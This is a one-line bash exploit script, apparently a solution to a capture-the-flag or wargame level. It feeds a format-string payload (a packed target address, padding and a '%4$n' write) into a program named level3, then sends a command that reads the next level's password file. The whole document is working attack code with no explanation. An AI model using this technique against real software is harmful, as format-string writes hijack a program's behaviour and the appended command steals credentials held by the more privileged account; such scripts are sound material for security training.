#!/bin/bash

(python -c 'import struct; print struct.pack("I", 0x804988c) + "A" * 60 + "%4$n"'; echo "cat /home/user/level4/.pass") | ~/level3
